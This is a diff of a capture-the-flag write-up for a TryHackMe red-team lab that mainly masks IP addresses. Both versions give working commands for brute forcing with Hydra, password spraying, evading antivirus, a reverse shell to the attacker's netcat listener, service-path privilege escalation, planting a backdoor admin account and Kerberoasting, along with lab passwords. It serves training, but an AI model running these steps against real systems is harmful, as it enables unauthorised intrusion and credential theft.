@@ -109,17 +109,17 @@ Downloading the Capstone Challenge resources, we receive two files detailing the
 
 We start by adding the IP addresses in our hosts file, so that we can resolve hostname even if we change subnets.
 ```txt
-10.200.89.11 MAIL.thereserve.loc
-10.200.89.12 VPN.thereserve.loc
-10.200.89.13 WEB.thereserve.loc
+10.200.x.11 MAIL.thereserve.loc
+10.200.x.12 VPN.thereserve.loc
+10.200.x.13 WEB.thereserve.loc
 ```
 
 ### **SSH Registration**
 
 We accessed the e-citizen communication portal via SSH using the provided credentials and registered our account. This portal will be crucial for proving the compromises, as it requires us to perform specific steps on the compromised hosts.
 ```bash
-$ ssh e-citizen@10.200.113.250
-e-citizen@10.200.113.250's password: 
+$ ssh e-citizen@10.200.x.250
+e-citizen@10.200.x.250's password: 
 
 Welcome to the e-Citizen platform!
 Please make a selection:
@@ -137,13 +137,13 @@ Please take note of the following details and please make sure to save them, as 
 Username: ItsFadinG
 Password: 8y-oRyYwJhO8Q7xe
 MailAddr: ItsFadinG@corp.th3reserve.loc
-IP Range: 10.200.113.0/24
+IP Range: 10.200.x.0/24
 =======================================
 These details are now active. As you can see, we have already purchased a domain for **domain squatting** to be used for phishing.
 Once you discover the webmail server, you can use these details to authenticate and recover additional project information from your mailbox.
 Once you have performed actions to compromise the network, please authenticate to e-Citizen in order to provide an update to the government. If your update is sufficient, you will be awarded a flag to indicate progress.
 =======================================
-Please note once again that the e-Citizen platform, and this VPN server, 10.200.113.250, are not in-scope for this assessment.
+Please note once again that the e-Citizen platform, and this VPN server, 10.200.x.250, are not in-scope for this assessment.
 Any attempts made against this machine will result in a ban from the challenge.
 =======================================
 Best of luck and may you hack the bank!
@@ -157,7 +157,7 @@ Best of luck and may you hack the bank!
 
 We will start by doing Nmap to know the available ports on the WEB machine.
 ```bash
-nmap -p- 10.200.113.13           
+nmap -p- 10.200.x.13           
 Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-19 13:43 EET
 Not shown: 65533 closed tcp ports (reset)
 PORT   STATE SERVICE
@@ -192,16 +192,16 @@ Also, looking at the image name gave us hints about the email creation rules tha
 #### **Directory Brute forcing**
 ```bash
 ┌──(root㉿kali)-[/opt/dirsearch]
-└─$ python3 dirsearch.py -u 10.200.113.13 -e php --random-agent
+└─$ python3 dirsearch.py -u 10.200.x.13 -e php --random-agent
 
   _|. _ _  _  _  _ _|_    v0.4.3
  (_||| _) (/_(_|| (_| )
 
 Extensions: php | HTTP method: GET | Threads: 25 | Wordlist size: 9513
 
-Output: /opt/dirsearch/reports/_10.200.113.13/_24-05-19_14-22-08.txt
+Output: /opt/dirsearch/reports/_10.200.x.13/_24-05-19_14-22-08.txt
 
-Target: http://10.200.113.13/
+Target: http://10.200.x.13/
 
 [14:22:08] Starting:                                            
 [14:23:39] 200 -   24KB - /info.php                                        
@@ -211,32 +211,32 @@ Target: http://10.200.113.13/
 Great! There is an exposed PHP info file that is leaking so much info about this web server. Using a plugin for the browser called Wappalyzer, we can check on the technologies used by the server, including their versions. October CMS is being used, so let's brute force its directory.
 ```bash
 ┌──(root㉿kali)-[/opt/dirsearch]
-└─$ python3 dirsearch.py -u 10.200.113.13/october -e php --random-agent
+└─$ python3 dirsearch.py -u 10.200.x.13/october -e php --random-agent
 
   _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                                                                                            
  (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                   
 Extensions: php | HTTP method: GET | Threads: 25 | Wordlist size: 9513
 
-Output: /opt/dirsearch/reports/_10.200.113.13/_october_24-05-19_14-31-34.txt
+Output: /opt/dirsearch/reports/_10.200.x.13/_october_24-05-19_14-31-34.txt
 
-Target: http://10.200.113.13/
+Target: http://10.200.x.13/
 
 [14:31:35] Starting: october/                                                                                                                                                                                                               
 [14:31:44] 200 -   15B  - /october/.gitignore                                                                 
-[14:32:42] 301 -  323B  - /october/config  ->  http://10.200.113.13/october/config/
+[14:32:42] 301 -  323B  - /october/config  ->  http://10.200.x.13/october/config/
 [14:32:43] 200 -  683B  - /october/config/                                  
 [14:32:43] 500 -    0B  - /october/config/app.php
 [14:33:10] 200 -    1KB - /october/index.php                                                 
-[14:33:26] 301 -  324B  - /october/modules  ->  http://10.200.113.13/october/modules/
+[14:33:26] 301 -  324B  - /october/modules  ->  http://10.200.x.13/october/modules/
 [14:33:26] 200 -  478B  - /october/modules/                                 
 [14:33:42] 200 -  453B  - /october/plugins/                                 
-[14:33:42] 301 -  324B  - /october/plugins  ->  http://10.200.113.13/october/plugins/
+[14:33:42] 301 -  324B  - /october/plugins  ->  http://10.200.x.13/october/plugins/
 [14:33:47] 200 -    2KB - /october/README.md                                
 [14:33:52] 200 -    1KB - /october/server.php                               
-[14:34:00] 301 -  324B  - /october/storage  ->  http://10.200.113.13/october/storage/
+[14:34:00] 301 -  324B  - /october/storage  ->  http://10.200.x.13/october/storage/
 [14:34:00] 200 -  549B  - /october/storage/                                 
 [14:34:05] 200 -  454B  - /october/themes/                                  
-[14:34:05] 301 -  323B  - /october/themes  ->  http://10.200.113.13/october/themes/
+[14:34:05] 301 -  323B  - /october/themes  ->  http://10.200.x.13/october/themes/
 [14:34:11] 200 -  780B  - /october/vendor/                                  
 [14:34:11] 200 -    0B  - /october/vendor/composer/autoload_classmap.php    
 [14:34:11] 200 -    0B  - /october/vendor/composer/autoload_files.php
@@ -249,25 +249,25 @@ Target: http://10.200.113.13/
 [14:34:12] 200 -    0B  - /october/vendor/composer/autoload_psr4.php        
 [14:34:13] 200 -  132KB - /october/vendor/composer/installed.json     
 ```
-Going through the discovered paths indicating that there are so many directory listing in this web server but one of them caught my eyes! `http://10.200.113.13/october/modules/`
+Going through the discovered paths indicating that there are so many directory listing in this web server but one of them caught my eyes! `http://10.200.x.13/october/modules/`
 ![Untitled](/assets/N-RedTeamCC/Untitled%202.png)
 
 Going through the backend files, it tells us that there is an administration panel, but what is its path? With the help of brute forcing and guessing, I was able to discover the correct path for the administration panel.
 ```bash
-python3 dirsearch.py -u 10.200.113.13/october/index.php/ -e php --random-agent                   
+python3 dirsearch.py -u 10.200.x.13/october/index.php/ -e php --random-agent                   
 
   _|. _ _  _  _  _ _|_    v0.4.3                                                                                    
  (_||| _) (/_(_|| (_| )                                                                                             
      
 Extensions: php | HTTP method: GET | Threads: 25 | Wordlist size: 9513
 
-Output: /opt/dirsearch/reports/_10.200.113.13/_october_index.php__24-05-19_15-06-24.txt
+Output: /opt/dirsearch/reports/_10.200.x.13/_october_index.php__24-05-19_15-06-24.txt
 
-Target: http://10.200.113.13/
+Target: http://10.200.x.13/
 
 [15:06:25] Starting: october/index.php/                                                                             
 [15:06:29] 404 -  275B  - /october/index.php/%2e%2e//google.com             
-[15:07:33] 302 -  482B  - /october/index.php/backend/  ->  http://10.200.113.13/october/index.php/backend/backend/auth
+[15:07:33] 302 -  482B  - /october/index.php/backend/  ->  http://10.200.x.13/october/index.php/backend/backend/auth
 [15:07:59] 200 -  965B  - /october/index.php/error                          
 [15:08:00] 200 -  965B  - /october/index.php/error/     
 ```
@@ -298,16 +298,16 @@ a normal login page, but if we got any creds we will get access to the Internal 
 #### **Directory Brute forcing**
 ```bash
 ┌──(root㉿kali)-[/opt/dirsearch]
-└─$ python3 dirsearch.py -u http://10.200.113.12/ --random-agent
+└─$ python3 dirsearch.py -u http://10.200.x.12/ --random-agent
 
   _|. _ _  _  _  _ _|_    v0.4.3                                                                                    
  (_||| _) (/_(_|| (_| )                                                                                             
 
 Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11590
 
-Output: /opt/dirsearch/reports/http_10.200.113.12/__24-05-19_15-48-16.txt
+Output: /opt/dirsearch/reports/http_10.200.x.12/__24-05-19_15-48-16.txt
 
-Target: http://10.200.113.12/
+Target: http://10.200.x.12/
 
 [15:48:16] Starting:                                                                                                                                            
 [15:50:24] 200 -    5B  - /login.php                                        
@@ -326,7 +326,7 @@ hmm! What could this ovpn file give us access to? Let’s try to connect and see
 ┌──(root㉿kali)-[~/THM/N-RedTeamCC]
 └─$ ifconfig tun1     
 tun1: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
-        inet **12.100.1.8**  netmask 255.255.255.0  destination 12.100.1.8
+        inet 12.100.1.x  netmask 255.255.255.0  destination 12.100.1.x
         unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
         RX packets 1  bytes 48 (48.0 B)
         RX errors 0  dropped 0  overruns 0  frame 0
@@ -340,7 +340,7 @@ We have been assigned a new IP, let’s scan this subnet with Nmap.
 Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-20 13:30 EET
 Nmap scan report for 1.mubc.chcg.chcgil24.dsl.att.net (12.100.1.1)
 Host is up (0.18s latency).
-Nmap scan report for 9.mubc.chcg.chcgil24.dsl.att.net (12.100.1.9)
+Nmap scan report for 9.mubc.chcg.chcgil24.dsl.att.net (12.100.1.x)
 Host is up.
 Nmap done: 256 IP addresses (2 hosts up) scanned in 14.68 seconds
 ```
@@ -393,13 +393,13 @@ PORT STATE SERVICE
 49682/tcp open unknown
 
 ┌──(root㉿kali)-[~/THM/N-RedTeamCC]
-└─$ nmap -p22,25,80,110,135,139,143,445,587,3306,3389,5985,33060,47001,49664,49665,49666,49667,49668,49669,49670,49682 10.200.113.11 -A
+└─$ nmap -p22,25,80,110,135,139,143,445,587,3306,3389,5985,33060,47001,49664,49665,49666,49667,49668,49669,49670,49682 10.200.x.11 -A
 Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-20 15:36 EET
 Stats: 0:00:37 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
 Service scan Timing: About 61.90% done; ETC: 15:37 (0:00:22 remaining)
 Stats: 0:00:39 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
 Service scan Timing: About 61.90% done; ETC: 15:37 (0:00:23 remaining)
-Nmap scan report for 10.200.113.11
+Nmap scan report for 10.200.x.11
 Host is up (0.15s latency).
 
 PORT      STATE  SERVICE       VERSION
@@ -476,7 +476,7 @@ PORT      STATE  SERVICE       VERSION
 #### **Directory Brute forcing**
 ```bash
 ──(root㉿kali)-[~]
-└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.200.89.11//october/index.php/FUZZ
+└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.200.x.11//october/index.php/FUZZ
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -489,7 +489,7 @@ PORT      STATE  SERVICE       VERSION
 ________________________________________________
 
  :: Method           : GET
- :: URL              : http://10.200.113.11//october/index.php/FUZZ
+ :: URL              : http://10.200.x.11//october/index.php/FUZZ
  :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
  :: Follow redirects : false
  :: Calibration      : false
@@ -510,7 +510,8 @@ $ rm thunderbird-*.tar.bz2
 $ mv thunderbird /opt
 $ sudo ln -s /opt/thunderbird/thunderbird /usr/local/bin/thunderbird
 ```
-Then run the **thunderbird** app and click on Set Up an Existing Email. Adding the password that we received earlier and connecting
+Then run the **thunderbird** app and click on Set Up an Existing Email. Adding the password that we received earlier and connecting.
+
 ![Untitled](/assets/N-RedTeamCC/Untitled%207.png)
 
 Once connected, we will find the following message:
@@ -581,7 +582,7 @@ with open('generated_passwords.txt2', 'w') as f:
             f.write(pwd + '\n')
 ```
 
-Running the script will expand our wordlist with, 1440 new passwords. We have multiple choices for using this wordlist as we have *( The Admin Panel for October CMS - The VPN Portal -  SSH Services and others - SMTP Mail Server ).* 
+Running the script will expand our wordlist with, 1440 new passwords. We have multiple choices for using this wordlist as we have ***( The Admin Panel for October CMS - The VPN Portal -  SSH Services and others - SMTP Mail Server )*** 
 
 #### **Brute forcing the Mail Server**
 We have already collected some info about the team working for the Reserve company and already know the email format that is being used. Let’s create our email wordlist and start the attack.
@@ -607,61 +608,64 @@ applications@corp.thereserve.loc
 ```
 I will be using Hydra tool for this attack.
 ```bash
-$ hydra -L ../emails.txt -P generated_passwords2.txt 10.200.113.11 smtp 
+$ hydra -L ../emails.txt -P generated_passwords2.txt 10.200.x.11 smtp 
 Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-21 14:31:13
 [INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 25920 login tries (l:18/p:1440), ~1620 tries per task
-[DATA] attacking smtp://10.200.113.11:25/
+[DATA] attacking smtp://10.200.x.11:25/
 [STATUS] 1049.00 tries/min, 1049 tries in 00:01h, 24871 to do in 00:24h, 16 active
 [STATUS] 1016.00 tries/min, 3048 tries in 00:03h, 22872 to do in 00:23h, 16 active
 [STATUS] 1066.71 tries/min, 7467 tries in 00:07h, 18453 to do in 00:18h, 16 active
 [STATUS] 1056.83 tries/min, 12682 tries in 00:12h, 13238 to do in 00:13h, 16 active
 [STATUS] 1030.06 tries/min, 17511 tries in 00:17h, 8409 to do in 00:09h, 16 active
-**[25][smtp] host: 10.200.113.11   login: laura.wood@corp.thereserve.loc   password: Password1@**
+[25][smtp] host: 10.200.x.11   login: laura.wood@corp.thereserve.loc   password: Password1
 [STATUS] 1045.00 tries/min, 22990 tries in 00:22h, 2930 to do in 00:03h, 16 active
-**[25][smtp] host: 10.200.113.11   login: mohammad.ahmed@corp.thereserve.loc   password: Password1!**
+[25][smtp] host: 10.200.x.11   login: mohammad.ahmed@corp.thereserve.loc   password: Password1
 1 of 1 target successfully completed, 2 valid passwords found
 ```
-Yess!! We have a valid creds. I thought of accessing their mailbox might lead to sensitive information, but it is EMPTY :)
+Yess!! We have a valid creds. I thought of accessing their mailbox might lead to sensitive information, but it is EMPTY:)
 ![Untitled](/assets/N-RedTeamCC/Untitled%2010.png)
 
 #### **Password Spraying**
 Hmm! Since there are no emails in their inbox, let’s try to spray those valid creds on the available services. I have tried those creds against the following: 
-- **10.200.113.11** — MailBox - SSH - RDP
-- **10.200.113.12** — SSH - VPN Portal Login
-- **10.200.113.13** — SSH - October CMS Admin Panel
-- **10.200.113.21** - RDP ***(Worked!)***
-- **10.200.113.22** - RDP ***(Worked!)***
+- **10.200.x.11** — MailBox - SSH - RDP
+- **10.200.x.12** — SSH - VPN Portal Login
+- **10.200.x.13** — SSH - October CMS Admin Panel
+- **10.200.x.21** - RDP ***(Worked!)***
+- **10.200.x.22** - RDP ***(Worked!)***
+
 ```bash
 ┌──(root㉿kali)-[~/THM/N-RedTeamCC]
-└─$ hydra -L names.txt -P valid_passwords 10.200.113.21 rdp
+└─$ hydra -L names.txt -P valid_passwords 10.200.x.21 rdp
 
-[3389][rdp] host: 10.200.113.21   login: mohammad.ahmed   password: Password1!
+[3389][rdp] host: 10.200.x.21   login: mohammad.ahmed   password: Password1!
 
 1 of 1 target successfully completed, 1 valid password found
                                                                                                              
 ┌──(root㉿kali)-[~/THM/N-RedTeamCC]
-└─$ hydra -L names.txt -P valid_passwords 10.200.113.22 rdp
+└─$ hydra -L names.txt -P valid_passwords 10.200.x.22 rdp
 
-[3389][rdp] host: 10.200.113.22   login: laura.wood   password: Password1@
-[3389][rdp] host: 10.200.113.22   login: mohammad.ahmed   password: Password1!
+[3389][rdp] host: 10.200.x.22   login: laura.wood   password: Password1@
+[3389][rdp] host: 10.200.x.22   login: mohammad.ahmed   password: Password1!
 
 1 of 1 target successfully completed, 2 valid passwords found
 ```
+
 ## **Foothold on The Corporate Division Tier 2 Infrastructure**
 let’s access them and see what is inside.
 ```bash
-$ xfreerdp /u:mohammad.ahmed /p:'Password1!' +clipboard /dynamic-resolution /cert:ignore /v:10.200.113.21 /drive:share,/opt/
+$ xfreerdp /u:mohammad.ahmed /p:'Password1!' +clipboard /dynamic-resolution /cert:ignore /v:10.200.x.21 /drive:share,/opt/
 ```
+
 ![Untitled](/assets/N-RedTeamCC/Untitled%2011.png)
 
 **Submitting Flags**
 ```bash
 ┌──(root㉿kali)-[~]
-└─$ ssh e-citizen@10.200.113.250
-e-citizen@10.200.113.250's password: 
+└─$ ssh e-citizen@10.200.x.250
+e-citizen@10.200.x.250's password: 
 
 Welcome to the e-Citizen platform!
 Please make a selection:
@@ -719,7 +723,7 @@ Once you have performed the steps, please enter Y to verify your access.
 If you wish to fully exit verification and try again please, please enter X.
 If you wish to remove this verification attempt, please enter Z
 Ready to verify? [Y/X/Z]: Y
-Warning: Permanently added '10.200.113.22' (ECDSA) to the list of known hosts.
+Warning: Permanently added '10.200.x.22' (ECDSA) to the list of known hosts.
 ItsFadinG.txt                                                                                                                                                                                           100%   41    36.2KB/s   00:00    
 
 Well done! Check your email!
@@ -737,13 +741,15 @@ We are now able to obtain the following flags:
 ![Untitled](/assets/N-RedTeamCC/Untitled%2014.png)
 
 ## **Administrative access to Corporate Division Tier 2 Infrastructure**
-### **WRK1 Machine**
-#### **Enumeration**
+### **Enumeration**
+
+**From WRK1 Machine**
 **NMAP**
-Let's see the open ports and available services.
+
+Let's check the open ports and available services for the WRK1 and WRK2 machines.
 ```bash
 ┌──(root㉿kali)-[~/THM/N-RedTeamCC]
-└─$ nmap -Pn 10.200.113.21 -T4 
+└─$ nmap -Pn 10.200.x.21 -T4 
 Host is up (0.19s latency).
 Not shown: 995 filtered tcp ports (no-response)
 PORT     STATE SERVICE
@@ -754,7 +760,7 @@ PORT     STATE SERVICE
 3389/tcp open  ms-wbt-server
 
 ┌──(root㉿kali)-[~/THM/N-RedTeamCC]
-└─$ nmap -Pn 10.200.113.21 -T4 -p22,135,139,445,3389 -A    
+└─$ nmap -Pn 10.200.x.21 -T4 -p22,135,139,445,3389 -A    
 PORT     STATE SERVICE       VERSION
 22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
 | ssh-hostkey: 
@@ -765,24 +771,24 @@ PORT     STATE SERVICE       VERSION
 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
 445/tcp  open  microsoft-ds?
 3389/tcp open  ms-wbt-server Microsoft Terminal Services
-| ssl-cert: Subject: commonName=**WRK1.corp.thereserve.loc**
+| ssl-cert: Subject: commonName=WRK1.corp.thereserve.loc
 | Not valid before: 2024-05-18T10:42:39
 |_Not valid after:  2024-11-17T10:42:39
 | rdp-ntlm-info: 
 |   Target_Name: CORP
 |   NetBIOS_Domain_Name: CORP
-**|   NetBIOS_Computer_Name: WRK1
+|   NetBIOS_Computer_Name: WRK1
 |   DNS_Domain_Name: corp.thereserve.loc
-|   DNS_Computer_Name: WRK1.corp.thereserve.loc**
+|   DNS_Computer_Name: WRK1.corp.thereserve.loc
 |   DNS_Tree_Name: thereserve.loc
 |   Product_Version: 10.0.17763
 |_  System_Time: 2024-05-20T12:25:06+00:00
 |_ssl-date: 2024-05-20T12:25:45+00:00; -1s from scanner time.
                                   
 ┌──(root㉿kali)-[~/THM/N-RedTeamCC]
-└─$ nmap -Pn 10.200.113.22 -T4 
+└─$ nmap -Pn 10.200.x.22 -T4 
 Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-20 14:05 EET
-Nmap scan report for 10.200.113.22
+Nmap scan report for 10.200.x.22
 Host is up (0.26s latency).
 Not shown: 994 closed tcp ports (reset)
 PORT     STATE SERVICE
@@ -794,9 +800,9 @@ PORT     STATE SERVICE
 5357/tcp open  wsdapi
 
 ┌──(root㉿kali)-[~/THM/N-RedTeamCC]
-└─$ nmap -Pn 10.200.113.22 -T4 -p22,135,139,445,3389,5357 -A
+└─$ nmap -Pn 10.200.x.22 -T4 -p22,135,139,445,3389,5357 -A
 Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-20 14:23 EET
-Nmap scan report for 10.200.113.22
+Nmap scan report for 10.200.x.22
 Host is up (0.31s latency).
 
 PORT     STATE SERVICE       VERSION
@@ -813,8 +819,8 @@ PORT     STATE SERVICE       VERSION
 |   Target_Name: CORP
 |   NetBIOS_Domain_Name: CORP
 |   NetBIOS_Computer_Name: WRK2
-**|   DNS_Domain_Name: corp.thereserve.loc
-|   DNS_Computer_Name: WRK2.corp.thereserve.loc**
+|   DNS_Domain_Name: corp.thereserve.loc
+|   DNS_Computer_Name: WRK2.corp.thereserve.loc
 |   DNS_Tree_Name: thereserve.loc
 |   Product_Version: 10.0.17763
 |_  System_Time: 2024-05-20T12:23:30+00:00
@@ -836,6 +842,7 @@ Host script results:
 |_    Message signing enabled but not required
 ```
 **Manual Enumeration**
+
 ```powershell
 PS C:\Users\mohammad.ahmed> hostname
 WRK1
@@ -864,7 +871,7 @@ Home directory
 Last logon                   5/22/2024 11:18:43 AM
 Logon hours allowed          All
 Local Group Memberships
-**Global Group memberships     *Help Desk            *Domain Users**
+Global Group memberships     *Help Desk            *Domain Users
 The command completed successfully.
 
 PS C:\Users\mohammad.ahmed> whoami /priv
@@ -885,7 +892,9 @@ laura.wood               mohammad.ahmed
 The command completed successfully.
 ```
 **PowerVeiw**
-The normal enumeration method will not be sufficient for us to get as much info as we need. Powerview or the AD module should help us get more information. But the WRK1 and WRK2 machines have Windows Defender installed and enabled. 
+
+The normal enumeration method will not be sufficient for us to get as much info as we need. Powerview or the AD module should help us get more information. But the WRK1 and WRK2 machines have Windows Defender installed and enabled.
+
 ```powershell
 PS C:\Users\mohammad.ahmed> Import-Module  \\tsclient\share\PowerView.ps1
 Import-Module : Operation did not complete successfully because the file contains a virus or potentially unwanted software.
@@ -897,7 +906,7 @@ At line:1 char:1
 
 ```
 
-#### **AV Evasion**
+### **AV Evasion**
 So I have tried a simple way to bypass it. Removing most of the comments in the file and changing the file name.
 ```powershell
 PS C:\Users\mohammad.ahmed> Import-Module  \\tsclient\share\notpv.ps1
@@ -976,7 +985,7 @@ instancetype          : 4
 objectguid            : ef6d9255-1df6-480e-86f6-ae870f3e490b
 objectcategory        : CN=Group,CN=Schema,CN=Configuration,DC=thereserve,DC=loc
 ```
-#### **Privilege Escalation**
+### **Privilege Escalation**
 I found an interesting folder Called **"Backup Service"** in the root directory of `C:` that had another folder inside of it called "Full Backup" that had an executable file in it called `backup.exe`. 
 ```powershell
 PS C:\> ls
@@ -1027,12 +1036,12 @@ Stopped  Backup             backup
 It appears that this is a service, but it has been stopped. Let’s dig more to see if we can exploit it or not.
 ```powershell
 PS C:\Backup Service\Full Backup> Get-WmiObject win32_Service | Select-Object Name, State, Startmode, description, PathName, DisplayName, startname | Select-String -Pattern 'backup'
-@{Name=Backup; State=Stopped; Startmode=Manual; description=; **PathName=C:\Backup Service\Full Backup\backup.exe**; DisplayName=Backup; startname=**LocalSystem**}
+@{Name=Backup; State=Stopped; Startmode=Manual; description=; PathName=C:\Backup Service\Full Backup\backup.exe; DisplayName=Backup; startname=LocalSystem}
 ```
 Here it is! This service is being executed with Local System permission, and it is vulnerable to unquoted service paths. So exploiting this service will grant us Local Admin access on the WRK1 machine. As the WRK1 machine has Windows Defender enabled, we need to find a shell that passes the AV. Let’s try this one:
 [https://github.com/izenynn/c-reverse-shell](https://github.com/izenynn/c-reverse-shell)
 ```bash
-$ ./change_client.sh 12.100.1.8 9009                               
+$ ./change_client.sh 12.100.1.x 9009                               
 Done!                                                                                                 
 $ i686-w64-mingw32-gcc-win32 -std=c99 windows.c -o rsh.exe -lws2_32                                                                                                 
 $ cp rsh.exe ~/THM/N-RedTeamCC\Capstone_Challenge_Resources/Tools 
@@ -1048,7 +1057,7 @@ More help is available by typing NET HELPMSG 2186.
 ```bash
 $ rlwrap nc -nvlp 9009
 listening on [any] 9009 ...
-connect to [12.100.1.8] from (UNKNOWN) [10.200.89.21] 63432
+connect to [12.100.1.x] from (UNKNOWN) [10.200.x.21] 63432
 Microsoft Windows [Version 10.0.17763.4252]
 (c) 2018 Microsoft Corporation. All rights reserved.
 
@@ -1060,7 +1069,7 @@ C:\Windows\system32>hostname
 hostname
 WRK1
 ```
-#### **Persistence**
+### **Persistence**
 let’s do persistence and create our own privileged username.
 
 ```bash
@@ -1075,14 +1084,15 @@ net localgroup "Remote Desktop Users" ItsFadinG /add
 The command completed successfully.
 ```
 We are now able to obtain the following flag:
-- ***Administrative access to Corporate Division Tier 2 Infrastructure***
+- ***Flag 4, Administrative access to Corporate Division Tier 2 Infrastructure***
 
 ## **Corporate Division Tier 1 Infrastructure**
-### **WRK1 Machine**
-#### **Enumeration**
+### **Enumeration**
+
+**From WRK1 Machine**
 We have achieved local administrator access on the machine. However, to fully compromise the Active Directory, we need to obtain a Domain Administrator account. I have dived deep into enumeration, and I couldn’t find something interesting except this service account.
 ```powershell
-PS C:\Users\mohammad.ahmed> Get-DomainUser -Identity **svcOctober**
+PS C:\Users\mohammad.ahmed> Get-DomainUser -Identity svcOctober
 
 logoncount            : 14
 badpasswordtime       : 1/1/1601 12:00:00 AM
@@ -1119,17 +1129,19 @@ usnchanged            : 527762
 ```
 Usually in any tryhackme ad room, if there are any service accounts, these accounts will be Kerberoastable and their passwords can be cracked. Let’s follow our intuition and see.
 
-#### **Kerbroasting**
+### **Kerbroasting**
 **Remotely**
+
 I have tried this attack from my kali machine but it wasn’t working at all. and I wasn’t sure what was the reason.
 ```bash
 ┌──(root㉿kali)-[~/THM/N-RedTeamCC]
-└─$ python3 /usr/local/bin/GetUserSPNs.py corp.thereserve.loc/laura.wood:Password1@ -dc-ip 10.200.89.102 -request  
+└─$ python3 /usr/local/bin/GetUserSPNs.py corp.thereserve.loc/laura.wood:Password1@ -dc-ip 10.200.x.102 -request  
 Impacket v0.10.1.dev1+20230223.202738.f4b848fa - Copyright 2022 Fortra
 
 [-] [Errno 110] Connection timed out
 ```
 **Locally**
+
 Using the PowerShell script, [Invoke-Kerberoast](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1) from the [Empire](https://github.com/EmpireProject/Empire) project, which can be loaded directly into memory:
 ```powershell
 # IK == Invoke-Kerberoast.ps1
@@ -1161,12 +1173,12 @@ And let’s try to crack those Kerberos tickets hashes with Hashcat. Unfortunate
 $krb5tgs$23$*svcScanning$corp.thereserve.loc$cifs/scvScanning*$3c70f983c9acda432f26512a5a5737a1$a337fb6cc70470fb26daf6dff8f3a13e394043c0f8e20eabfdc0de508aaa344d27289c155b4afdcfe91b69841ed1a734bb9848d9c459acfa8c5403ce6e24d4e84666a786ec8c667cac9bea1a58aee4ad18f0a0fd313096a389d9b87c92a8747c674c5aa116c4a6e5957bc0e4ebec4b535edda0bbffe8bfe8953717c02f3c59b3041e0d6a3ab60915498dfaa12ede45ee126809cb8ae4bdaa5914c54e4f38eb338cc19df5dec384ba5840a9c846d4d570a9f632f2e4cc7d1829242ec437690ef70c0dab8fa99a723df232a3ea7719664afa146afac9915674da4f93e1f4a3c9d5f01563682e158a2e74a4649ea62b7790bd09ff5a5f942ceed23de9680db06c86d5dc02af788295f6b6c300cd007801d507ab2a0cf6aa6cf2e3999d8097bbb75deb7f87493aced88cbb221f23d5ae04a3faba8bfa730dbf29719b589b296c80d1ae80239343c421a5d9d2c61def7c162bb37db39d61ac2ce6a07060537c2d7ff04ac7823facd26642ceec6702f4ced133fc26126f0f9dbdd460a3316c7a29cde1c6f631a9c5ed89b7fb322548d1ad19f4d79e7f43a9f87733b3798e34c0e4faae7055ebf467f7b87885d121324781ca11257783e216cabb9b9725a7938c026cad39fbdf8bf353a3fe814a2214bff2b31dd1a39630bcfd3404c8b36f6118c483d8c13e63fc5ab7bcec54b835eeba7049346449b46ff718df40316bf7ca2597c47bde6d9417fb9b0161a224ff7010e7d61e3a59d6f744f766c1c3d3ec1a663fa56d72acdc615a709bf00e1bfb5da5026ecb6757dc3db03e575f9e9d25fd90e0fe3e0a1601d54ff5d6b5c3c041faef12d88b1f2f45c2969fab93add7ee4252613c7f534c6cd8239533aadbf3741471043559b2627b7ddbd7a818f7400991965cfa723787c41425b5556f1dd29c9351fe23cdba6a24ef13e5f41548a1c9b74f672f8ce68dcae990afe8622bb8db779e5eb75a58dc89e4494bea5e17f309b50e441b69fe805eecd721f6a916a130452d5ae08e8a239dd36868580dc56f67c13457fd5781cc0a970c4e1371090e7a597021d2b7b8b91fdb662a0dbd04b605e551780fc697887b74ccb6c92f8ae83c7d1072fa441ab60a2e44d2a84ab92d0fefb42562d5d794895a75eac77c718e402667d895fe3c3319b7716d334b98289a07a60c8b55c3a215d873a97f6de51ebda290b80c94e64e6e0414c518dabc0912fb7f64988577bab69e36e291e6cebf88b35c07d560a78b74965e6931638b03f438c50ea4045d6ec3d239e5ac2bc7e7de665c2cdf6dac536547e8a1beea225cb55c9886a10a099e9af9f77dcdcd3956fa7b227fdf244f3f7a1fd8104e4fcd913c9d604d90ced1b78c0d1684dfb8c5f9fd2a415992d8fb73c63812ed00ad2d399a984db389ecb33bd91ae6e63f2f748d0299ef658058d7b381fd45545b6bf1bfb15e9f9e81a215db7244939918ed30981abf017301724c75ba183974302432b56a0d5805f479d177cd1be6b960f6fc328bf665659baf0757801eec8a367cb2d81db650853d68e992686a8abb47b071d3e75d0a17fb46fd774263c038278a29dd0986a2ccaccc63fd94b9a697834374f62c04c1cc514171a7bc70d6612fa86de41d171fb0d297197f87a97f36aed024a2c730380edcb56b6487d846a191ea491706c5a4542afe75701f165a8652255cfd26829f9abf4e38116f42defd798055b464ccba3287c767041eeb54d5004047bedc5316423f2fddc79368a8f6a27a748df20b:**Password1!**
 ```
 Also, another way that I have tried is doing password spraying. As we have two valid passwords, we can use them against all enumerated users.
-#### **Password Spraying**
+### **Password Spraying**
 ```bash
-$ crackmapexec smb 10.200.113.21 -u All_users.txt -p valid_passwords --continue-on-success
